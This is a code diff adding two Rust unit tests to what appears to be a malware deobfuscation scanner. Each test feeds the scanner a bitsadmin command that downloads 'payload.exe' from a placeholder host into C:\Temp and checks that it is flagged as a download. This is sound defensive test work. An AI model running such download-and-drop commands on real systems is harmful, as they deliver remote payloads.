@@ -24526,6 +24526,48 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_attached_transfer_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer:job1 /download /priority:foreground "https://bits-attached-transfer.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-transfer.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured attached bitsadmin transfer download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_attached_addfile_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /addfile:job1 "https://bits-attached-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured attached bitsadmin addfile download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
